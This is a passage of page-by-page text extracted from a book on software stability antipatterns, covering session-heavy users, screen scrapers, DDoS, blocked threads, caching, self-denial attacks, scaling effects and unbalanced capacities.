cookie machinery for you, presenting a nice program- matic interface with some resemblance to a Map or Dictionary. As usual, though, the trouble with invisible machinery is that it can go horribly wrong when misused. When that invisible machinery involves layers of kludges meant to make HTTP look like a real application protocol, it can tip over badly. For example, home-brew shopping bots do not handle session cookies properly. Each request creates a new session, consuming memory for no good reason. If the web server is configured to ask the application server for every URL, not just ones within a mapped context, then sessions can get created by requests for nonexistent pages.\n\nreport erratum • discuss",
      "content_length": 3668,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 71,
      "content": "Imagine 100,000 transactions all trying to update the same row of the same table in the same database. Somebody is bound to get deadlocked. Once a single transaction with a lock on the user’s profile gets hung (because of the need for a connection from a different resource pool), all the other database transactions on that row get blocked. Pretty soon, every single request-handling thread gets used up with these bogus logins. As soon as that happens, the site is down.\n\nSo one group of bad users just blunder around leaving disaster in their wake. More crafty sorts, however, deliberately do abnormal things that just happen to have undesirable effects. The first group isn’t deliberately malicious; they do damage inadvertently. This next group belongs in its own category.\n\nAn entire parasitic industry exists by consuming resources from other com- panies’ websites. Collectively known as competitive intelligence companies, these outfits leech data out of your system one web page at a time.\n\nThese companies will argue that their service is no different from a grocery store sending someone into a competing store with a list and a clipboard. There is a big difference, though. Given the rate that they can request pages, it’s more like sending a battalion of people into the store with clipboards. They would crowd out the aisles so legitimate shoppers could not get in.\n\nWorse yet, these rapid-fire screen scrapers do not honor session cookies, so if you are not using URL rewriting to track sessions, each new page request will create a new session. Like a flash mob, pretty soon the capacity problem will turn into a stability problem. The battalion of price checkers could actu- ally knock down the store.\n\nKeeping out legitimate robots is fairly easy through the use of the robots.txt file.5 The robot has to ask for the file and choose to respect your wishes. It’s a social convention—not even a standard—and definitely not enforceable. Some sites also choose to redirect robots and spiders, based on the user-agent header. In the best cases, these agents get redirected to a static copy of the product catalog, or the site generates pages without prices. (The idea is to be searchable by the big search engines but not reveal pricing. That way, you can personalize the prices, run trial offers, partition the country or the audience to conduct market tests, and so on.) In the worst case, the site sends the agent into a dead end.\n\nSo the robots most likely to respect robots.txt are the ones that might actually generate traffic (and revenue) for you, while the leeches ignore it completely.\n\nI’ve seen only two approaches work.\n\n5.\n\nwww.w3.org/TR/html4/appendix/notes.html#h-B.4.1.1\n\nUsers • 59\n\nreport erratum • discuss",
      "content_length": 2738,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 72,
      "content": "Chapter 4. Stability Antipatterns • 60\n\nThe first is technical. Once you identify a screen scraper, block it from your network. If you’re using a content distribution network such as Akamai, it can provide this service for you. Otherwise, you can do it at the outer firewalls. Some of the leeches are honest. Their requests come from legitimate IP addresses with real reverse DNS entries. ARIN is your friend here.6 Blocking the honest ones is easy. Others stealthily mask their source addresses or make requests from dozens of different addresses. Some of these even go so far as to change their user-agent strings around from one request to the next. (When a single IP address claims to be running Internet Explorer on Windows, Opera on Mac, and Firefox on Linux in the same five-minute window, some- thing is up. Sure, it could be an ISP-level supersquid or somebody running a whole bunch of virtual emulators. When these requests are sequentially spidering an entire product category, it’s more likely to be a screen scraper.) You may end up blocking quite a few subnets, so it’s a good idea to periodi- cally expire old blocks to keep your firewalls performing well. This is a form of Circuit Breaker.\n\nThe second approach is legal. Write some terms of use for your site that say users can view content only for personal or noncommercial purposes. Then, when the screen scrapers start hitting your site, sic the lawyers on them. (Obviously, this requires enough legal firepower to threaten them effectively.) Neither of these is a permanent solution. Consider it pest control—once you stop, the infestation will resume.\n\nMalicious Users\n\nThe final group of undesirable users are the truly malicious. These bottom- feeding mouth breathers just live to kill your baby. Nothing excites them more than destroying the very thing you’ve put blood, sweat, and tears into building. These were the kids who always got their sand castles kicked over when they were little. That deep-seated bitterness compels them to do the same thing to others that was done to them.\n\nTruly talented crackers who can analyze your defenses, develop a customized attack, and infiltrate your systems without being spotted are blessedly rare. This is the so-called “advanced persistent threat.” Once you are targeted by such an entity, you will almost certainly be breached. Consult a serious reference on security for help with this. I cannot offer you sound advice beyond that. This gets into deep waters with respect to law enforcement and forensic evidence.\n\n6.\n\nwww.arin.net\n\nreport erratum • discuss",
      "content_length": 2580,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 73,
      "content": "The overwhelming majority of malicious users are known as “script kiddies.” Don’t let the diminutive name fool you. Script kiddies are dangerous because of their sheer numbers. Although the odds are low that you will be targeted by a true cracker, your systems are probably being probed by script kiddies right now.\n\nThis book is not about information security or online warfare. A robust approach to defense and deterrence is beyond my scope. I will restrict my discussion to the intersection of security and stability as it pertains to system and software architecture. The primary risk to stability is the now-classic distributed denial-of-service (DDoS) attack. The attacker causes many com- puters, widely distributed across the Net, to start generating load on your site. The load typically comes from a botnet. Botnet hosts are usually compro- mised Windows PCs, but with the Internet of Things taking off, we can expect to see that population diversify to include thermostats and refrigerators. A daemon on the compromised computer polls some control channel like IRC or even customized DNS queries, through which the botnet master issues com- mands. Botnets are now big business in the dark Net, with pay-as-you-go service as sophisticated as any cloud.\n\nNearly all attacks vector in against the applications rather than the network gear. These force you to saturate your own outbound bandwidth, denying service to legitimate users and racking up huge bandwidth charges.\n\nAs you have seen before, session management is the most vulnerable point of a server-side web application. Application servers are particularly fragile when hit with a DDoS, so saturating the bandwidth might not even be the worst issue you have to deal with. A specialized Circuit Breaker can help to limit the damage done by any particular host. This also helps protect you from the accidental traffic floods, too.\n\nNetwork vendors all have products that detect and mitigate DDoS attacks. Proper configuring and monitoring of these products is essential. It’s best to run these in “learning” or “baseline” mode for at least a month to understand what your normal, cyclic traffic patterns are.\n\nRemember This\n\nUsers consume memory.\n\nEach user’s session requires some memory. Minimize that memory to improve your capacity. Use a session only for caching so you can purge the session’s contents if memory gets tight.\n\nUsers • 61\n\nreport erratum • discuss",
      "content_length": 2433,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 74,
      "content": "Chapter 4. Stability Antipatterns • 62\n\nUsers do weird, random things.\n\nUsers in the real world do things that you won’t predict (or sometimes understand). If there’s a weak spot in your application, they’ll find it through sheer numbers. Test scripts are useful for functional testing but too predictable for stability testing. Look into fuzzing toolkits, property- based testing, or simulation testing.\n\nMalicious users are out there.\n\nBecome intimate with your network design; it should help avert attacks. Make sure your systems are easy to patch—you’ll be doing a lot of it. Keep your frameworks up-to-date, and keep yourself educated.\n\nUsers will gang up on you.\n\nSometimes they come in really, really big mobs. When Taylor Swift tweets about your site, she’s basically pointing a sword at your servers and crying, “Release the legions!” Large mobs can trigger hangs, deadlocks, and obscure race conditions. Run special stress tests to hammer deep links or hot URLs.\n\nBlocked Threads\n\nManaged runtime languages such as C#, Java, and Ruby almost never really crash. Sure, they get application errors, but it’s relatively rare to see the kind of core dump that a C or C++ program would have. I still remember when a rogue pointer in C could reduce the whole machine to a navel-gazing heap. (Anyone else remember Amiga’s “Guru Meditation” errors?) Here’s the catch about interpreted languages, though. The interpreter can be running, and the application can still be totally deadlocked, doing nothing useful.\n\nAs often happens, adding complexity to solve one problem creates the risk of entirely new failure modes. Multithreading makes application servers scalable enough to handle the web’s largest sites, but it also introduces the possibility of concurrency errors. The most common failure mode for applications built in these languages is navel-gazing—a happily running interpreter with every single thread sitting around waiting for Godot. Multithreading is complex enough that entire books are written about it. (For the Java programmers: the only book on Java you actually need, however, is Brian Goetz’s excellent Java Concurrency in Practice [Goe06].) Moving away from the “fork, run, and die” execution model brings you vastly higher capacity but only by introducing a new risk to stability.\n\nreport erratum • discuss",
      "content_length": 2330,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 75,
      "content": "Blocked Threads • 63\n\nThe majority of system failures I have dealt with do not involve outright crashes. The process runs and runs but does nothing because every thread available for processing transactions is blocked waiting on some impossible outcome.\n\nI’ve probably tried a hundred times to explain the distinction between saying “the system crashed” and “the system is hung.” I finally gave up when I realized that it’s a distinction only an engineer bothers with. It’s like a physicist trying to explain where the photon goes in the two-slit experiment from quantum mechanics. Only one observable variable really matters—whether the system is able to process transactions or not. The business sponsor would frame this question as, “Is it generating revenue?”\n\nFrom the users’ perspective, a system they can’t use might as well be a smoking crater in the earth. The simple fact that the server process is running doesn’t help the user get work done, books bought, flights found, and so on.\n\nThat’s why I advocate supplementing internal monitors (such as log file scraping, process monitoring, and port monitoring) with external monitoring. A mock client somewhere (not in the same data center) can run synthetic transactions on a regular basis. That client experiences the same view of the system that real users experience. If that client cannot process the synthetic transactions, then there is a problem, whether or not the server process is running.\n\nMetrics can reveal problems quickly too. Counters like “successful logins” or “failed credit cards” will show problems long before an alert goes off.\n\nBlocked threads can happen anytime you check resources out of a connection pool, deal with caches or object registries, or make calls to external systems. If the code is structured properly, a thread will occasionally block whenever two (or more) threads try to access the same critical section at the same time. This is normal. Assuming that the code was written by someone sufficiently skilled in multithreaded programming, then you can always guarantee that the threads will eventually unblock and continue. If this describes you, then you are in a highly skilled minority.\n\nThe problem has four parts:\n\nError conditions and exceptions create too many permutations to test\n\nexhaustively.\n\nUnexpected interactions can introduce problems in previously safe code.\n\nreport erratum • discuss",
      "content_length": 2399,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 76,
      "content": "Chapter 4. Stability Antipatterns • 64\n\nTiming is crucial. The probability that the app will hang goes up with the\n\nnumber of concurrent requests.\n\nDevelopers never hit their application with 10,000 concurrent requests.\n\nTaken together, these conditions mean that it’s very, very hard to find hangs during development. You can’t rely on “testing them out of the system.” The best way to improve your chances is to carefully craft your code. Use a small set of primitives in known patterns. It’s best if you download a well-crafted, proven library.\n\nIncidentally, this is another reason why I oppose anyone rolling their own connection pool class. It’s always more difficult than you think to make a reliable, safe, high-performance connection pool. If you’ve ever tried writing unit tests to prove safe concurrency, you know how hard it is to achieve confidence in the pool. Once you start trying to expose metrics, as I discuss in Designing for Transparency, on page 164, rolling your own connection pool goes from a fun Computer Science 101 exercise to a tedious grind.\n\nIf you find yourself synchronizing methods on your domain objects, you should probably rethink the design. Find a way that each thread can get its own copy of the object in question. This is important for two reasons. First, if you are synchronizing the methods to ensure data integrity, then your application will break when it runs on more than one server. In-memory coherence doesn’t matter if there’s another server out there changing the data. Second, your application will scale better if request-handling threads never block each other.\n\nOne elegant way to avoid synchronization on domain objects is to make your domain objects immutable. Use them for querying and rendering. When the time comes to alter their state, do it by constructing and issuing a “command object.” This style is called “Command Query Responsibility Separation,” and it nicely avoids a large number of concurrency issues.\n\nSpot the Blocking\n\nCan you find the blocking call in the following code?\n\nString key = (String)request.getParameter(PARAM_ITEM_SKU); Availability avl = globalObjectCache.get(key);\n\nYou might suspect that globalObjectCache is a likely place to find some synchro- nization. You would be correct, but the point is that nothing in the calling code tells you that one of these calls is blocking and the other is not. In fact,\n\nreport erratum • discuss",
      "content_length": 2422,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 77,
      "content": "Blocked Threads • 65\n\nthe interface that globalObjectCache implemented didn’t say anything about synchronization either.\n\nIn Java, it’s possible for a subclass to declare a method synchronized that is unsynchronized in its superclass or interface definition. In C#, a subclass can annotate a method as synchronizing on “this.” Both of these are frowned on, but I’ve observed them in the wild. Object theorists will tell you that these examples violate the Liskov substitution principle. They are correct.\n\nIn object theory, the Liskov substitution principle (see Family Values: A Behavioral Notion of Subtyping [LW93]) states that any property that is true about objects of a type T should also be true for objects of any subtype of T. In other words, a method without side effects in a base class should also be free of side effects in derived classes. A method that throws the exception E in base classes should throw only exceptions of type E (or subtypes of E) in derived classes.\n\nJava and C# do not let you get away with other violations of the substitution principle, so I do not know why this one is allowed. Functional behavior composes, but concurrency does not compose. As a result, though, when subclasses add synchronization to methods, you cannot transparently replace an instance of the superclass with the synchronized subclass. This might seem like nit-picking, but it can be vitally important. The basic imple- mentation of the GlobalObjectCache interface is a relatively straightforward object registry:\n\npublic synchronized Object get(String id) {\n\nObject obj = items.get(id); if(obj == null) {\n\nobj = create(id); items.put(id, obj);\n\n}\n\nreturn obj;\n\n}\n\nThe “synchronized” keyword there should draw your attention. That’s a Java keyword that makes that method into a critical section. Only one thread may execute inside the method at a time. While one thread is executing this method, any other callers of the method will be blocked. Synchronizing the method here worked because the test cases all returned quickly. So even if there was some contention between threads trying to get into this method, they should all be served fairly quickly. But like the end of Back to the Future, the problem wasn’t with this class but its descendants.\n\nreport erratum • discuss",
      "content_length": 2284,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 78,
      "content": "Chapter 4. Stability Antipatterns • 66\n\nPart of the system needed to check the in-store availability of items by making expensive inventory availability queries to a remote system. These external calls took a few seconds to execute. The results were known to be valid for at least fifteen minutes because of the way the inventory system worked. Since nearly 25 percent of the inventory lookups were on the week’s “hot items” and there could be as many as 4,000 (worst case) concurrent requests against the undersized, overworked inventory system, the developer decided to cache the resulting Availability object.\n\nThe developer decided that the right metaphor was a read-through cache. On a hit, it would return the cached object. On a miss, it would do the query, cache the result, and then return it. Following good object orientation princi- ples, the developer decided to create an extension of GlobalObjectCache, overriding the get() method to make the remote call. It was a textbook design. The new RemoteAvailabilityCache was a caching proxy, as described in Pattern Languages of Program Design 2 [VCK96]. It even had a timestamp on the cached entries so they could be expired when the data became too stale. This was an elegant design, but it wasn’t enough.\n\nThe problem with this design had nothing to do with the functional behavior. Functionally, RemoteAvailabilityCache was a nice piece of work. In times of stress, however, it had a nasty failure mode. The inventory system was undersized (see Unbalanced Capacities, on page 75), so when the front end got busy, the back end would be flooded with requests. Eventually it crashed. At that point, any thread calling RemoteAvailabilityCache.get() would block, because one single thread was inside the create() call, waiting for a response that would never come. There they sit, Estragon and Vladimir, waiting endlessly for Godot.\n\nThis example shows how these antipatterns interact perniciously to accelerate the growth of cracks. The conditions for failure were created by the blocking threads and the unbalanced capacities. The lack of timeouts in the integration points caused the failure in one layer to become a cascading failure. Ultimately, this combination of forces brought down the entire site.\n\nObviously, the business sponsors would laugh if you asked them, “Should the site crash if it can’t check availability for in-store pickup?” If you asked the architects or developers, “Will the site crash if it can’t check availability?” they would assert that it would not. Even the developer of RemoteAvailabilityCache would not expect the site to hang if the inventory system stopped responding. No one designed this failure mode into the combined system, but no one designed it out either.\n\nreport erratum • discuss",
      "content_length": 2784,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 79,
      "content": "Blocked Threads • 67\n\nUse Caching, Carefully\n\nCaching can be a powerful response to a performance problem. It can reduce the load on the database server and cut response times to a fraction of what they would be without caching. When misused, however, caching can create new problems.\n\nThe maximum memory usage of all application-level caches should be configurable. Caches that do not limit maximum memory consumption will eventually eat away at the memory available for the system. When that happens, the garbage collector will spend more and more time attempting to recover enough memory to process requests. By consuming memory needed for other tasks, the cache will actually cause a serious slowdown.\n\nNo matter what memory size you set on the cache, you need to monitor hit rates for the cached items to see whether most items are being used from cache. If hit rates are very low, then the cache is not buying any performance gains and might actually be slower than not using the cache. Keeping something in cache is a bet that the cost of generating it once, plus the cost of hashing and lookups, is less than the cost of generating it every time it’s needed. If a particular cached object is used only once during the lifetime of a server, then caching it is of no help.\n\nIt’s also wise to avoid caching things that are cheap to generate. I’ve seen content caches that had hundreds of cache entries that consisted of a single space character.\n\nCaches should be built using weak references to hold the cached item itself. If mem- ory gets low, the garbage collector is permitted to reap any object that is reachable only via weak references. As a result, caches that use weak references will help the garbage collector reclaim memory instead of preventing it.\n\nFinally, any cache presents a risk of stale data. Every cache should have an invalidation strategy to remove items from cache when its source data changes. The strategy you choose can have a major impact on your system’s capacity. For example, a point-to- point notification might work well when there are ten or twelve instances in your service. If there are thousands of instances, then point-to-point unicast is not effective and you need to look at either a message queue or some form of multicast notification. When invalidating, be careful to avoid the Database Dogpile (see Dogpile, on page 78.)\n\nLibraries\n\nLibraries are notorious sources of blocking threads, whether they are open- source packages or vendor code. Many libraries that work as service clients do their own resource pooling inside the library. These often make request threads block forever when a problem occurs. Of course, these never allow you to configure their failure modes, like what to do when all connections are tied up waiting for replies that’ll never come.\n\nreport erratum • discuss",
      "content_length": 2836,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 80,
      "content": "Chapter 4. Stability Antipatterns • 68\n\nIf it’s an open source library, then you may have the time, skills, and resources to find and fix such problems. Better still, you might be able to search through the issue log to see if other people have already done the hard work for you.\n\nOn the other hand, if it’s vendor code, then you may need to exercise it yourself to see how it behaves under normal conditions and under stress. For example, what does it do when all connections are exhausted?\n\nIf it breaks easily, you need to protect your request-handling threads. If you can set timeouts, do so. If not, you might have to resort to some complex structure such as wrapping the library with a call that returns a future. Inside the call, you use a pool of your own worker threads. Then when the caller tries to execute the dangerous operation, one of the worker threads starts the real call. If the call makes it through the library in time, then the worker thread delivers its result to the future. If the call does not complete in time, the request-handling thread abandons the call, even though the worker thread might eventually complete. Once you’re in this territory, beware. Here there be dragons. Go too far down this path and you’ll find you’ve written a reactive wrapper around the entire client library.\n\nIf you’re dealing with vendor code, it may also be worth some time beating them up for a better client library.\n\nA blocked thread is often found near an integration point. These blocked threads can quickly lead to chain reactions if the remote end of the integration fails. Blocked threads and slow responses can create a positive feedback loop, amplifying a minor problem into a total failure.\n\nRemember This\n\nRecall that the Blocked Threads antipattern is the proximate cause of most failures.\n\nApplication failures nearly always relate to Blocked Threads in one way or another, including the ever-popular “gradual slowdown” and “hung server.” The Blocked Threads antipattern leads to Chain Reactions and Cascading Failures antipatterns.\n\nScrutinize resource pools.\n\nLike Cascading Failures, the Blocked Threads antipattern usually happens around resource pools, particularly database connection pools. A deadlock in the database can cause connections to be lost forever, and so can incorrect exception handling.\n\nreport erratum • discuss",
      "content_length": 2356,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 81,
      "content": "Self-Denial Attacks • 69\n\nUse proven primitives.\n\nLearn and apply safe primitives. It might seem easy to roll your own pro- ducer/consumer queue: it isn’t. Any library of concurrency utilities has more testing than your newborn queue.\n\nDefend with Timeouts.\n\nYou cannot prove that your code has no deadlocks in it, but you can make sure that no deadlock lasts forever. Avoid infinite waits in function calls; use a version that takes a timeout parameter. Always use timeouts, even though it means you need more error-handling code.\n\nBeware the code you cannot see.\n\nAll manner of problems can lurk in the shadows of third-party code. Be very wary. Test it yourself. Whenever possible, acquire and investigate the code for surprises and failure modes. You might also prefer open source libraries to closed source for this very reason.\n\nSelf-Denial Attacks\n\nSelf-denial is only occasionally a virtue in people and never in systems. A self- denial attack describes any situation in which the system—or the extended system that includes humans—conspires against itself.\n\nThe classic example of a self-denial attack is the email from marketing to a “select group of users” that contains some privileged information or offer. These things replicate faster than the Anna Kournikova Trojan (or the Morris worm, if you’re really old school). Any special offer meant for a group of 10,000 users is guaranteed to attract millions. The community of networked bargain hunters can detect and share a reusable coupon code in milliseconds.\n\nOne great instance of self-denial occurred when the Xbox 360 was just becoming available for preorder. It was clear that demand would far outstrip supply in the United States, so when a major electronics retailer sent out an email promoting preorders, it helpfully included the exact date and time that the preorder would open. This email hit FatWallet, TechBargains, and prob- ably other big deal-hunter sites the same day. It also thoughtfully included a deep link that accidentally bypassed Akamai, guaranteeing that every image, JavaScript file, and style sheet would be pulled directly from the origin servers.\n\nOne minute before the appointed time, the entire site lit up like a nova, then went dark. It was gone in sixty seconds.\n\nreport erratum • discuss",
      "content_length": 2287,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 82,
      "content": "Chapter 4. Stability Antipatterns • 70\n\nEveryone who has ever worked a retail site has a story like this. Sometimes it’s the coupon code that gets reused a thousand times or the pricing error that makes one SKU get ordered as many times as all other products com- bined. As Paul Lord says, “Good marketing can kill you at any time.”\n\nChannel partners can help you attack yourself, too. I’ve seen a channel partner take a database extract and then start accessing every URL in the database to cache pages.\n\nNot every self-inflicted wound can be blamed on the marketing department (although we sure can try). In a horizontal layer that has some shared resources, it’s possible for a single rogue server to damage all the others. For example, in an ATG-based infrastructure,7 one lock manager always handles distributed lock management to ensure cache coherency. Any server that wants to update a RepositoryItem with distributed caching enabled must acquire the lock, update the item, release the lock, and then broadcast a cache inval- idation for the item. This lock manager is a singular resource. As the site scales horizontally, the lock manager becomes a bottleneck and then finally a risk. If a popular item is inadvertently modified (because of a programming error, for example), then you can end up with thousands of request-handling threads on hundreds of servers all serialized waiting for a write lock on one item.\n\nAvoiding Self-Denial\n\nYou can avoid machine-induced self-denial by building a “shared-nothing” architecture. (“Shared-nothing” is what you have when each server can run without knowing anything about any other server. The machines don’t share databases, cluster managers, or any other resource. It’s a hypothetical ideal for horizontal scaling. In reality there’s always some amount of contention and coordination among the servers, but we can sometimes approximate shared-nothing.) Where that’s impractical, apply decoupling middleware to reduce the impact of excessive demand, or make the shared resource itself horizontally scalable through redundancy and a backside synchronization protocol. You can also design a fallback mode for the system to use when the shared resource is not available or not responding. For example, if a lock manager that provides pessimistic locking is not available, the application can fall back to using optimistic locking.\n\nIf you have a little time to prepare and are using hardware load balancing for traffic management, you can either set aside a portion of your infrastructure or provision new cloud resources to handle the promotion or traffic surge. Of\n\n7.\n\nwww.oracle.com/applications/customer-experience/ecommerce/products/commerce-platform/index.html\n\nreport erratum • discuss",
      "content_length": 2744,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 83,
      "content": "Scaling Effects • 71\n\ncourse, this works only if the extraordinary traffic is directed at a portion of the system. In this case, even if the dedicated portion melts down, at least the rest of the system’s regular behavior is available.\n\nAutoscaling can help when the traffic surge does arrive, but watch out for the lag time. Spinning up new virtual machines takes precious minutes. My advice is to “pre-autoscale” by upping the configuration before the marketing event goes out.\n\nAs for the human-facilitated attacks, the keys are training, education, and communication. At the very least, if you keep the lines of communication open, you might have a chance to protect the systems from the coming surge. You might even be able to help them achieve their goals without jeopardizing the system.\n\nRemember This\n\nKeep the lines of communication open.\n\nSelf-denial attacks originate inside your own organization, when people cause self-inflicted wounds by creating their own flash mobs and traffic spikes. You can aid and abet these marketing efforts and protect your system at the same time, but only if you know what’s coming. Make sure nobody sends mass emails with deep links. Send mass emails in waves to spread out the peak load. Create static “landing zone” pages for the first click from these offers. Watch out for embedded session IDs in URLs.\n\nProtect shared resources.\n\nProgramming errors, unexpected scaling effects, and shared resources all create risks when traffic surges. Watch out for Fight Club bugs, where increased front-end load causes exponentially increasing back-end processing.\n\nExpect rapid redistribution of any cool or valuable offer.\n\nAnybody who thinks they’ll release a special deal for limited distribution is asking for trouble. There’s no such thing as limited distribution. Even if you limit the number of times a fantastic deal can be redeemed, you’ll still get crushed with people hoping beyond hope that they, too, can get a PlayStation Twelve for $99.\n\nScaling Effects\n\nIn biology, the square-cube law explains why we’ll never see elephant-sized spiders. The bug’s weight scales with volume, so it goes as O(n^3). The strength of the leg scales with the area of the cross section, so it goes as O(n^2). If you\n\nreport erratum • discuss",
      "content_length": 2272,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 84,
      "content": "Chapter 4. Stability Antipatterns • 72\n\nmake the critter ten times as large, that makes the strength-to-weight ratio one-tenth of the small version, and the legs just can’t hold it up.\n\nWe run into such scaling effects all the time. Anytime you have a “many-to-one” or “many-to-few” relationship, you can be hit by scaling effects when one side increases. For instance, a database server that holds up just fine when ten machines call it might crash miserably when you add the next fifty machines.\n\nIn the development environment, every application runs on one machine. In QA, pretty much every application looks like one or two machines. When you get to production, though, some applications are really, really small, and some are medium, large, or humongous. Because the development and test environments rarely replicate production sizing, it can be hard to see where scaling effects will bite you.\n\nPoint-to-Point Communications\n\nOne of the worst places that scaling effects will bite you is with point-to-point communication. Point-to-point communication between machines probably works just fine when only one or two instances are communicating, as in the following figure.\n\nQA Server 2\n\nDev Server\n\nApp 1\n\nDevelopmentEnvironment\n\nQA Server 1QA / TestEnvironment\n\nApp 2\n\nApp 1\n\nWith point-to-point connections, each instance has to talk directly to every other instance, as shown in the next figure.\n\nApp n\n\nApp 2\n\nApp 1\n\nProd Server 2Production Environment\n\nProd Server n\n\nProd Server 1\n\nreport erratum • discuss",
      "content_length": 1519,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 85,
      "content": "Scaling Effects • 73\n\nThe total number of connections goes up as the square of the number of instances. Scale that up to a hundred instances, and the O(n^2) scaling becomes quite painful. This is a multiplier effect driven by the number of application instances. Depending on the eventual size of your system, O(n^2) scaling might be fine. Either way, you should know about this effect before your system hits production.\n\nBe sure to distinguish between point-to-point inside a service versus point- to-point between services. The usual pattern between services is fan-in from my farm of machines to a load balancer in front of your machines. This is a different case. Here we’re not talking about having every service call every other service.\n\nUnfortunately, unless you are Microsoft or Google, it is unlikely you can build a test farm the same size as your production environment. This type of defect cannot be tested out; it must be designed out.\n\nThis is one of those times where there is no “best” choice, just a good choice for a particular set of circumstances. If the application will only ever have two servers, then point-to-point communication is perfectly fine. (As long as the communication is written so it won’t block when the other server dies!) As the number of servers grows, then a different communication strategy is needed. Depending on your infrastructure, you can replace point-to-point communication with the following:\n\nUDP broadcasts • TCP or UDP multicast • Publish/subscribe messaging • Message queues\n\nBroadcasts do the job but aren’t bandwidth-efficient. They also cause some additional load on servers that aren’t interested in the messages, since the servers’ NIC gets the broadcast and must notify the TCP/IP stack. Multicasts are more efficient, since they permit only the interested servers to receive the message. Publish/subscribe messaging is better still, since a server can pick up a message even if it wasn’t listening at the precise moment the message was sent. Of course, publish/subscribe messaging often brings in some serious infrastructure cost. This is a great time to apply the XP principle that says, “Do the simplest thing that will work.”\n\nShared Resources\n\nAnother scaling effect that can jeopardize stability is the “shared resource” effect. Commonly seen in the guise of a service-oriented architecture or\n\nreport erratum • discuss",
      "content_length": 2387,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 86,
      "content": "Chapter 4. Stability Antipatterns • 74\n\n“common services” project, the shared resource is some facility that all members of a horizontally scalable layer need to use. With some application servers, the shared resource will be a cluster manager or a lock manager. When the shared resource gets overloaded, it’ll become a bottleneck limiting capacity. The following figure should give you an idea of how the callers can put a hurting on the shared resource.\n\nApp 1\n\nApp 2\n\nCommon Service\n\nApp 3\n\nApp 4\n\nApp 5\n\nApp 6\n\nWhen the shared resource is redundant and nonexclusive—meaning it can service several of its consumers at once—then there’s no problem. If it satu- rates, you can add more, thus scaling the bottleneck.\n\nThe most scalable architecture is the shared-nothing architecture. Each server operates independently, without need for coordination or calls to any centralized services. In a shared nothing architecture, capacity scales more or less linearly with the number of servers.\n\nThe trouble with a shared-nothing architecture is that it might scale better at the cost of failover. For example, consider session failover. A user’s session resides in memory on an application server. When that server goes down, the next request from the user will be directed to another server. Obviously, we’d like that transition to be invisible to the user, so the user’s session should be loaded into the new application server. That requires some kind of coordination between the original application server and some other device. Perhaps the application server sends the user’s session to a session backup server after each page request. Maybe it serializes the session into a database table or shares its sessions with another designated application server. There are numerous strategies for session failover, but they all involve getting the user’s session off the original server. Most of the time, that implies some level of shared resources.\n\nYou can approximate a shared-nothing architecture by reducing the fan-in of shared resources, i.e., cutting down the number of servers calling on the shared resource. In the example of session failover, you could do this by designating pairs of application servers that each act as the failover server for the other.\n\nreport erratum • discuss",
      "content_length": 2289,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 87,
      "content": "Unbalanced Capacities • 75\n\nToo often, though, the shared resource will be allocated for exclusive use while a client is processing some unit of work. In these cases, the probability of con- tention scales with the number of transactions processed by the layer and the number of clients in that layer. When the shared resource saturates, you get a connection backlog. When the backlog exceeds the listen queue, you get failed transactions. At that point, nearly anything can happen. It depends on what function the caller needs the shared resource to provide. Particularly in the case of cache managers (providing coherency for distributed caches), failed transactions lead to stale data or—worse—loss of data integrity.\n\nRemember This\n\nExamine production versus QA environments to spot Scaling Effects.\n\nYou get bitten by Scaling Effects when you move from small one-to-one development and test environments to full-sized production environments. Patterns that work fine in small environments or one-to-one environments might slow down or fail completely when you move to production sizes.\n\nWatch out for point-to-point communication.\n\nPoint-to-point communication scales badly, since the number of connec- tions increases as the square of the number of participants. Consider how large your system can grow while still using point-to-point connections —it might be sufficient. Once you’re dealing with tens of servers, you will probably need to replace it with some kind of one-to-many communication.\n\nWatch out for shared resources.\n\nShared resources can be a bottleneck, a capacity constraint, and a threat to stability. If your system must use some sort of shared resource, stress- test it heavily. Also, be sure its clients will keep working if the shared resource gets slow or locks up.\n\nUnbalanced Capacities\n\nWhether your resources take months, weeks, or seconds to provision, you can end up with mismatched ratios between different layers. That makes it possible for one tier or service to flood another with requests beyond its capacity. This especially holds when you deal with calls to rate-limited or throttled APIs!\n\nIn the illustration on page 76, the front-end service has 3,000 request-handling threads available. During peak usage, the majority of these will be serving product catalog pages or search results. Some smaller number will be in various corporate “telling” pages. A few will be involved in a checkout process.\n\nreport erratum • discuss",
      "content_length": 2467,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 88,
      "content": "Chapter 4. Stability Antipatterns • 76\n\nFront End\n\n20 Hosts75 Instances3,000 Threads\n\nBack End\n\n6 Hosts6 Instances450 Threads\n\nOf the threads serving a checkout-related page, a tiny fraction will be querying the scheduling service to see whether the item can be installed in the cus- tomer’s home by a local delivery team. You can do some math and science to predict how many threads could be making simultaneous calls to the scheduling system. The math is not hard, though it does rely on both statistics and assumptions—a combination notoriously easy to manipulate. But as long as the scheduling service can handle enough simultaneous requests to meet that demand prediction, you’d think that should be sufficient.\n\nNot necessarily.\n\nSuppose marketing executes a self-denial attack by offering the free installation of any big-ticket appliance for one day only. Suddenly, instead of a tiny fraction of a fraction of front-end threads involving scheduling queries, you could see two times, four times, or ten times as many. The fact is that the front end always has the ability to overwhelm the back end, because their capacities are not balanced.\n\nIt might be impractical to evenly match capacity in each system for a lot of reasons. In this example, it would be a gross misuse of capital to build up every service to the same size just on the off chance that traffic all heads to one service for some reason. The infrastructure would be 99 percent idle except for one day out of five years!\n\nSo if you can’t build every service large enough to meet the potentially over- whelming demand from the front end, then you must build both callers and providers to be resilient in the face of a tsunami of requests. For the caller, Circuit Breaker will help by relieving the pressure on downstream services when responses get slow or connections get refused. For service providers, use Handshaking and Backpressure to inform callers to throttle back on the requests. Also consider Bulkheads to reserve capacity for high-priority callers of critical services.\n\nreport erratum • discuss",
      "content_length": 2079,
